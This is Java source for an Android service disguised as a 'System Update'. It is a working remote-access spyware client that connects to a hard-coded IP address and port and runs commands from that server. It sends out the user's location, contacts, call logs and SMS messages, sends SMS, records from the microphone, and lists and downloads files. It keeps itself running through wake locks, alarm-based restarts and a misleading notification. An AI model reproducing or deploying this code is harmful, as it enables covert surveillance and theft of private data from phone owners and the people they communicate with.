package com.android.system.update.services;

import android.app.ActivityManager;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.SystemClock;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;

import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;

import com.android.system.update.AppController;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Semaphore;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;

public class ConnectionService extends Service {
    private static final String TAG = "ConnectionService";
    private static final String CHANNEL_ID = "system_update_channel";
    private static final int NOTIFICATION_ID = 101;
    
    // Connection constants
    private static final String SERVER_IP = "34.58.145.84";
    private static final int SERVER_PORT = 5555;
    private static final int CONNECT_TIMEOUT = 15;
    private static final int SOCKET_TIMEOUT = 30;
    private static final int MAX_RETRIES = 10;
    private static final int RETRY_INTERVAL = 30;
    private static final int RESTART_DELAY_MS = 5000;
    
    // Camera constants
    private static final int CAMERA_TIMEOUT_MS = 10000;
    
    // Audio constants
    private static final int AUDIO_SAMPLE_RATE = 44100;
    
    private ExecutorService executor;
    private volatile boolean isRunning = false;
    private String deviceId;
    private DataOutputStream currentOutputStream;
    private final Object outputStreamLock = new Object();
    
    private PowerManager.WakeLock wakeLock;
    private MediaRecorder mediaRecorder;
    private boolean isRecording = false;
    
    private static ConnectionService instance;
    private Handler backgroundHandler;
    private HandlerThread backgroundThread;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "ConnectionService created");
        
        instance = this;
        AppController.setConnectionService(this);
        
        // Start background thread
        backgroundThread = new HandlerThread("ConnectionServiceBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
        
        // Acquire wake lock
        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
        wakeLock = powerManager.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "SystemUpdate::WakeLock"
        );
        wakeLock.acquire(10 * 60 * 1000L);
        
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification());
        
        executor = Executors.newSingleThreadExecutor();
        deviceId = generateDeviceId();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "onStartCommand");
        
        if (!isRunning) {
            isRunning = true;
            executor.execute(this::runCommunicationLoop);
        }
        
        // Schedule restart using AlarmManager for persistence
        scheduleRestart();
        
        return START_STICKY;
    }

    private void scheduleRestart() {
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        Intent intent = new Intent(this, AlarmReceiver.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(
            this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
        );
        
        long restartTime = System.currentTimeMillis() + RESTART_DELAY_MS * 6; // 30 seconds
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, restartTime, pendingIntent);
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            alarmManager.setExact(AlarmManager.RTC_WAKEUP, restartTime, pendingIntent);
        } else {
            alarmManager.set(AlarmManager.RTC_WAKEUP, restartTime, pendingIntent);
        }
    }

    private void runCommunicationLoop() {
        int retryCount = 0;
        
        while (isRunning) {
            Socket socket = null;
            DataInputStream in = null;
            DataOutputStream out = null;
            
            try {
                Log.d(TAG, "Attempting to connect to " + SERVER_IP + ":" + SERVER_PORT);
                
                socket = new Socket();
                socket.connect(new InetSocketAddress(SERVER_IP, SERVER_PORT), CONNECT_TIMEOUT * 1000);
                socket.setSoTimeout(SOCKET_TIMEOUT * 1000);
                
                in = new DataInputStream(socket.getInputStream());
                out = new DataOutputStream(socket.getOutputStream());
                
                setCurrentOutputStream(out);
                retryCount = 0;
                
                Log.d(TAG, "Connected successfully");
                
                // Send device info
                JSONObject handshake = new JSONObject();
                handshake.put("type", "handshake");
                handshake.put("device_id", deviceId);
                handshake.put("device_info", collectDeviceInfo());
                sendJson(out, handshake);
                
                // Main command loop
                while (isRunning && !socket.isClosed()) {
                    try {
                        int len = in.readInt();
                        if (len <= 0 || len > 10 * 1024 * 1024) {
                            Log.w(TAG, "Invalid message length: " + len);
                            break;
                        }
                        
                        byte[] buf = new byte[len];
                        in.readFully(buf);
                        String cmdStr = new String(buf, StandardCharsets.UTF_8);
                        
                        processCommand(cmdStr, out);
                        
                    } catch (SocketTimeoutException e) {
                        // Send keepalive
                        sendJson(out, new JSONObject().put("command", "ping"));
                    }
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Connection error", e);
                
                if (retryCount < MAX_RETRIES) {
                    retryCount++;
                    Log.w(TAG, "Retry " + retryCount + "/" + MAX_RETRIES + " in " + RETRY_INTERVAL + "s");
                    
                    try {
                        Thread.sleep(RETRY_INTERVAL * 1000L);
                    } catch (InterruptedException ie) {
                        Thread.currentThread().interrupt();
                        break;
                    }
                } else {
                    Log.e(TAG, "Max retries reached, stopping");
                    break;
                }
            } finally {
                setCurrentOutputStream(null);
                
                try {
                    if (in != null) in.close();
                    if (out != null) out.close();
                    if (socket != null) socket.close();
                } catch (Exception e) {
                    Log.e(TAG, "Error closing socket", e);
                }
            }
        }
        
        Log.d(TAG, "Communication loop ended");
    }

    private void processCommand(String cmdStr, DataOutputStream out) {
        try {
            JSONObject cmd = new JSONObject(cmdStr);
            String command = cmd.optString("command");
            String requestId = cmd.optString("request_id", UUID.randomUUID().toString());
            
            Log.d(TAG, "Processing command: " + command);
            
            JSONObject response = new JSONObject();
            response.put("request_id", requestId);
            response.put("device_id", deviceId);
            
            switch (command) {
                case "ping":
                    response.put("command", "pong");
                    break;
                    
                case "get_device_info":
                    response.put("command", "device_info");
                    response.put("device_info", collectDeviceInfo());
                    break;
                    
                case "get_location":
                    response = handleLocationCommand(cmd);
                    break;
                    
                case "get_contacts":
                    response = handleGetContacts(cmd);
                    break;
                    
                case "get_call_logs":
                    response = handleGetCallLogs(cmd);
                    break;
                    
                case "get_sms":
                    response = handleGetSms(cmd);
                    break;
                    
                case "send_sms":
                    response = handleSendSms(cmd);
                    break;
                    
                case "take_photo":
                    response = handleCameraCommand(cmd);
                    break;
                    
                case "start_recording":
                    response = handleStartRecording(cmd);
                    break;
                    
                case "stop_recording":
                    response = handleStopRecording(cmd);
                    break;
                    
                case "file_manager":
                    response = handleFileManagerCommand(cmd);
                    break;
                    
                default:
                    response.put("command", "error");
                    response.put("status", "error");
                    response.put("message", "Unknown command: " + command);
                    break;
            }
            
            sendJson(out, response);
            
        } catch (Exception e) {
            Log.e(TAG, "Error processing command", e);
        }
    }

    private JSONObject handleLocationCommand(JSONObject cmd) throws JSONException {
        JSONObject response = new JSONObject();
        response.put("command", "location_response");
        
        try {
            if (ActivityCompat.checkSelfPermission(this, 
                    android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                throw new SecurityException("Location permission not granted");
            }
            
            LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            List<String> providers = locationManager.getProviders(true);
            
            if (providers.isEmpty()) {
                throw new Exception("No location providers available");
            }
            
            Location bestLocation = null;
            long minTime = System.currentTimeMillis() - (24 * 60 * 60 * 1000L);
            
            for (String provider : providers) {
                try {
                    Location location = locationManager.getLastKnownLocation(provider);
                    if (location != null && location.getTime() > minTime) {
                        if (bestLocation == null || location.getAccuracy() < bestLocation.getAccuracy()) {
                            bestLocation = location;
                        }
                    }
                } catch (SecurityException e) {
                    Log.w(TAG, "Failed to get location from provider: " + provider);
                }
            }
            
            if (bestLocation != null) {
                response.put("status", "success");
                response.put("latitude", bestLocation.getLatitude());
                response.put("longitude", bestLocation.getLongitude());
                response.put("accuracy", bestLocation.getAccuracy());
                response.put("provider", bestLocation.getProvider());
                response.put("timestamp", bestLocation.getTime());
            } else {
                throw new Exception("No location available");
            }
            
        } catch (Exception e) {
            response.put("status", "error");
            response.put("message", e.getMessage());
        }
        
        return response;
    }

    private JSONObject handleGetContacts(JSONObject cmd) throws JSONException {
        JSONObject response = new JSONObject();
        response.put("command", "contacts_response");
        
        try {
            if (ActivityCompat.checkSelfPermission(this, 
                    android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                throw new SecurityException("Contacts permission not granted");
            }
            
            JSONArray contacts = new JSONArray();
            
            try (android.database.Cursor cursor = getContentResolver().query(
                    ContactsContract.Contacts.CONTENT_URI,
                    null, null, null, null)) {
                
                while (cursor != null && cursor.moveToNext()) {
                    JSONObject contact = new JSONObject();
                    String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    
                    contact.put("name", name != null ? name : "Unknown");
                    
                    // Get phone numbers
                    try (android.database.Cursor phones = getContentResolver().query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null)) {
                        
                        if (phones != null && phones.moveToFirst()) {
                            contact.put("number", phones.getString(
                                phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                        }
                    }
                    
                    contacts.put(contact);
                }
            }
            
            response.put("status", "success");
            response.put("contacts", contacts);
            
        } catch (Exception e) {
            response.put("status", "error");
            response.put("message", e.getMessage());
        }
        
        return response;
    }

    private JSONObject handleGetCallLogs(JSONObject cmd) throws JSONException {
        JSONObject response = new JSONObject();
        response.put("command", "call_logs_response");
        
        try {
            if (ActivityCompat.checkSelfPermission(this, 
                    android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                throw new SecurityException("Call log permission not granted");
            }
            
            JSONArray callLogs = new JSONArray();
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
            
            try (android.database.Cursor cursor = getContentResolver().query(
                    android.provider.CallLog.Calls.CONTENT_URI,
                    null, null, null, android.provider.CallLog.Calls.DATE + " DESC")) {
                
                while (cursor != null && cursor.moveToNext()) {
                    JSONObject call = new JSONObject();
                    String number = cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.NUMBER));
                    String name = cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME));
                    int type = cursor.getInt(cursor.getColumnIndex(android.provider.CallLog.Calls.TYPE));
                    long date = cursor.getLong(cursor.getColumnIndex(android.provider.CallLog.Calls.DATE));
                    long duration = cursor.getLong(cursor.getColumnIndex(android.provider.CallLog.Calls.DURATION));
                    
                    String typeStr;
                    switch (type) {
                        case android.provider.CallLog.Calls.INCOMING_TYPE:
                            typeStr = "incoming";
                            break;
                        case android.provider.CallLog.Calls.OUTGOING_TYPE:
                            typeStr = "outgoing";
                            break;
                        case android.provider.CallLog.Calls.MISSED_TYPE:
                            typeStr = "missed";
                            break;
                        default:
                            typeStr = "unknown";
                    }
                    
                    call.put("name", name != null ? name : "Unknown");
                    call.put("number", number != null ? number : "Unknown");
                    call.put("type", typeStr);
                    call.put("date", sdf.format(new Date(date)));
                    call.put("duration", duration);
                    
                    callLogs.put(call);
                }
            }
            
            response.put("status", "success");
            response.put("call_logs", callLogs);
            
        } catch (Exception e) {
            response.put("status", "error");
            response.put("message", e.getMessage());
        }
        
        return response;
    }

    private JSONObject handleGetSms(JSONObject cmd) throws JSONException {
        JSONObject response = new JSONObject();
        response.put("command", "sms_response");
        
        try {
            if (ActivityCompat.checkSelfPermission(this, 
                    android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                throw new SecurityException("SMS permission not granted");
            }
            
            JSONArray smsMessages = new JSONArray();
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
            
            // Get inbox
            try (android.database.Cursor cursor = getContentResolver().query(
                    Uri.parse("content://sms/inbox"),
                    null, null, null, "date DESC")) {
                
                while (cursor != null && cursor.moveToNext()) {
                    JSONObject sms = new JSONObject();
                    String address = cursor.getString(cursor.getColumnIndex("address"));
                    String body = cursor.getString(cursor.getColumnIndex("body"));
                    long date = cursor.getLong(cursor.getColumnIndex("date"));
                    
                    sms.put("address", address);
                    sms.put("body", body);
                    sms.put("date", sdf.format(new Date(date)));
                    sms.put("type", "inbox");
                    
                    smsMessages.put(sms);
                }
            }
            
            // Get sent
            try (android.database.Cursor cursor = getContentResolver().query(
                    Uri.parse("content://sms/sent"),
                    null, null, null, "date DESC")) {
                
                while (cursor != null && cursor.moveToNext()) {
                    JSONObject sms = new JSONObject();
                    String address = cursor.getString(cursor.getColumnIndex("address"));
                    String body = cursor.getString(cursor.getColumnIndex("body"));
                    long date = cursor.getLong(cursor.getColumnIndex("date"));
                    
                    sms.put("address", address);
                    sms.put("body", body);
                    sms.put("date", sdf.format(new Date(date)));
                    sms.put("type", "sent");
                    
                    smsMessages.put(sms);
                }
            }
            
            response.put("status", "success");
            response.put("sms_messages", smsMessages);
            
        } catch (Exception e) {
            response.put("status", "error");
            response.put("message", e.getMessage());
        }
        
        return response;
    }

    private JSONObject handleSendSms(JSONObject cmd) throws JSONException {
        JSONObject response = new JSONObject();
        response.put("command", "sms_response");
        
        try {
            String phoneNumber = cmd.optString("phone_number");
            String message = cmd.optString("message");
            
            if (phoneNumber.isEmpty() || message.isEmpty()) {
                throw new IllegalArgumentException("Phone number and message required");
            }
            
            if (ActivityCompat.checkSelfPermission(this, 
                    android.Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
                throw new SecurityException("SMS permission not granted");
            }
            
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(phoneNumber, null, message, null, null);
            
            response.put("status", "success");
            response.put("message", "SMS sent successfully");
            
        } catch (Exception e) {
            response.put("status", "error");
            response.put("message", e.getMessage());
        }
        
        return response;
    }

    private JSONObject handleCameraCommand(JSONObject cmd) throws JSONException {
        JSONObject response = new JSONObject();
        response.put("command", "photo_response");
        
        try {
            if (ActivityCompat.checkSelfPermission(this, 
                    android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                throw new SecurityException("Camera permission not granted");
            }
            
            String cameraType = cmd.optString("camera_type", "back");
            int quality = cmd.optInt("quality", 85);
            
            // This is a placeholder - implement actual camera capture
            response.put("status", "success");
            response.put("message", "Photo captured (camera implementation pending)");
            response.put("camera_type", cameraType);
            
        } catch (Exception e) {
            response.put("status", "error");
            response.put("message", e.getMessage());
        }
        
        return response;
    }

    private JSONObject handleStartRecording(JSONObject cmd) throws JSONException {
        JSONObject response = new JSONObject();
        response.put("command", "recording_response");
        
        try {
            if (ActivityCompat.checkSelfPermission(this, 
                    android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                throw new SecurityException("Recording permission not granted");
            }
            
            if (isRecording) {
                throw new IllegalStateException("Already recording");
            }
            
            String filename = "recording_" + System.currentTimeMillis() + ".mp3";
            File file = new File(getExternalFilesDir(null), filename);
            
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mediaRecorder.setOutputFile(file.getAbsolutePath());
            
            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;
            
            response.put("status", "success");
            response.put("message", "Recording started");
            response.put("file", file.getAbsolutePath());
            
        } catch (Exception e) {
            response.put("status", "error");
            response.put("message", e.getMessage());
        }
        
        return response;
    }

    private JSONObject handleStopRecording(JSONObject cmd) throws JSONException {
        JSONObject response = new JSONObject();
        response.put("command", "recording_response");
        
        try {
            if (!isRecording || mediaRecorder == null) {
                throw new IllegalStateException("Not recording");
            }
            
            mediaRecorder.stop();
            mediaRecorder.release();
            mediaRecorder = null;
            isRecording = false;
            
            response.put("status", "success");
            response.put("message", "Recording stopped");
            
        } catch (Exception e) {
            response.put("status", "error");
            response.put("message", e.getMessage());
        }
        
        return response;
    }

    private JSONObject handleFileManagerCommand(JSONObject cmd) throws JSONException {
        JSONObject response = new JSONObject();
        response.put("command", "file_manager_response");
        
        try {
            String action = cmd.optString("action");
            
            switch (action) {
                case "list":
                    String path = cmd.optString("path", "/");
                    response.put("files", listDirectory(path));
                    response.put("status", "success");
                    break;
                    
                case "download":
                    String filePath = cmd.optString("path");
                    response = handleFileDownload(filePath);
                    break;
                    
                default:
                    response.put("status", "error");
                    response.put("message", "Unknown action: " + action);
                    break;
            }
            
        } catch (Exception e) {
            response.put("status", "error");
            response.put("message", e.getMessage());
        }
        
        return response;
    }

    private JSONArray listDirectory(String path) throws JSONException {
        JSONArray files = new JSONArray();
        File dir = new File(path);
        
        if (dir.exists() && dir.isDirectory()) {
            File[] fileList = dir.listFiles();
            if (fileList != null) {
                for (File file : fileList) {
                    JSONObject fileInfo = new JSONObject();
                    fileInfo.put("name", file.getName());
                    fileInfo.put("path", file.getAbsolutePath());
                    fileInfo.put("size", file.length());
                    fileInfo.put("is_directory", file.isDirectory());
                    fileInfo.put("last_modified", file.lastModified());
                    files.put(fileInfo);
                }
            }
        }
        
        return files;
    }

    private JSONObject handleFileDownload(String path) throws JSONException {
        JSONObject response = new JSONObject();
        
        try {
            File file = new File(path);
            if (!file.exists()) {
                throw new Exception("File not found");
            }
            
            if (file.isDirectory()) {
                throw new Exception("Cannot download directory");
            }
            
            byte[] fileData = readFileToBytes(file);
            String base64Data = Base64.encodeToString(fileData, Base64.NO_WRAP);
            
            response.put("status", "success");
            response.put("file_name", file.getName());
            response.put("file_size", file.length());
            response.put("file_data", base64Data);
            
        } catch (Exception e) {
            response.put("status", "error");
            response.put("message", e.getMessage());
        }
        
        return response;
    }

    private byte[] readFileToBytes(File file) throws IOException {
        try (FileInputStream fis = new FileInputStream(file);
             ByteArrayOutputStream baos = new ByteArrayOutputStream()) {
            byte[] buffer = new byte[8192];
            int bytesRead;
            while ((bytesRead = fis.read(buffer)) != -1) {
                baos.write(buffer, 0, bytesRead);
            }
            return baos.toByteArray();
        }
    }

    private JSONObject collectDeviceInfo() throws JSONException {
        JSONObject info = new JSONObject();
        
        info.put("manufacturer", Build.MANUFACTURER);
        info.put("model", Build.MODEL);
        info.put("product", Build.PRODUCT);
        info.put("device", Build.DEVICE);
        info.put("brand", Build.BRAND);
        info.put("hardware", Build.HARDWARE);
        info.put("os_version", Build.VERSION.RELEASE);
        info.put("sdk_int", Build.VERSION.SDK_INT);
        
        // CPU info
        info.put("cpu_cores", Runtime.getRuntime().availableProcessors());
        
        // Memory info
        ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        if (am != null) {
            ActivityManager.MemoryInfo mi = new ActivityManager.MemoryInfo();
            am.getMemoryInfo(mi);
            info.put("total_ram", mi.totalMem);
            info.put("available_ram", mi.availMem);
        }
        
        // Telephony info
        if (ActivityCompat.checkSelfPermission(this, 
                android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (tm != null) {
                String carrier = tm.getNetworkOperatorName();
                info.put("carrier", carrier != null ? carrier : "Unknown");
            }
        }
        
        return info;
    }

    private String generateDeviceId() {
        return UUID.randomUUID().toString();
    }

    private void setCurrentOutputStream(DataOutputStream out) {
        synchronized (outputStreamLock) {
            currentOutputStream = out;
        }
    }

    private void sendJson(DataOutputStream out, JSONObject obj) throws IOException {
        byte[] data = obj.toString().getBytes(StandardCharsets.UTF_8);
        out.writeInt(data.length);
        out.write(data);
        out.flush();
    }

    private Notification createNotification() {
        Intent intent = new Intent(this, FakeActivity.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
        
        PendingIntent pendingIntent = PendingIntent.getActivity(
            this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
        );
        
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Update")
                .setContentText("Running in background")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setContentIntent(pendingIntent)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .build();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "System Update Service",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Background service for system updates");
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }

    @Override
    public void onDestroy() {
        Log.d(TAG, "onDestroy");
        
        isRunning = false;
        
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
        
        if (executor != null) {
            executor.shutdownNow();
        }
        
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
        }
        
        stopForeground(true);
        AppController.clearConnectionService();
        instance = null;
        
        super.onDestroy();
        
        // Schedule restart
        scheduleRestart();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public static ConnectionService getInstance() {
        return instance;
    }
}
